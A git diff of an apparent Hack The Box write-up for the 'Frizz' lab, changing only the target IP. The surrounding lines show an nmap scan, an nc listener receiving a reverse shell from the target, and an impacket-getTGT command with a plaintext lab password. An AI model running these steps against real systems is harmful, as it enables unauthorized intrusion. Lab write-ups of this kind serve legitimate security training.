@@ -33,14 +33,14 @@ image:
 Start with an Nmap scan
 
 ```
-nmap -sV 10.129.225.59
+nmap -sV 10.10.11.60
 ```
 
 ```jsx
 ┌──(kali㉿kali)-[~]
-└─$ nmap -sV 10.129.225.59
+└─$ nmap -sV 10.10.11.60
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 13:08 EDT
-Nmap scan report for 10.129.225.59
+Nmap scan report for 10.10.11.60
 Host is up (0.25s latency).
 Not shown: 987 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -74,8 +74,8 @@ Now, we need to update the /etc/hosts file.
 127.0.0.1       localhost
 127.0.1.1       kali
 
-10.129.225.59 frizzdc.frizz.htb
-10.129.225.59 frizz.htb
+10.10.11.60 frizzdc.frizz.htb
+10.10.11.60 frizz.htb
 
 ```
 
@@ -168,7 +168,7 @@ And success! We have a shell.
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9007         
 listening on [any] 9007 ...
-connect to [10.10.14.36] from (UNKNOWN) [10.129.225.59] 60865
+connect to [10.10.14.36] from (UNKNOWN) [10.10.11.60] 60865
 
 PS C:\xampp\htdocs\Gibbon-LMS> whoami
 frizz\w.webservice
@@ -299,10 +299,10 @@ impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip frizzdc.frizz.htb
 
 ```jsx
 ┌──(kali㉿kali)-[~]
-└─$ sudo ntpdate -i 10.129.225.59                                                     
+└─$ sudo ntpdate -i 10.10.11.60                                                     
 [sudo] password for kali: 
 Illegal option -i
-2025-03-16 14:09:56.287543 (-0400) +725.649114 +/- 0.116634 10.129.225.59 s1 no-leap
+2025-03-16 14:09:56.287543 (-0400) +725.649114 +/- 0.116634 10.10.11.60 s1 no-leap
 CLOCK: time stepped by 725.649114
                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~]
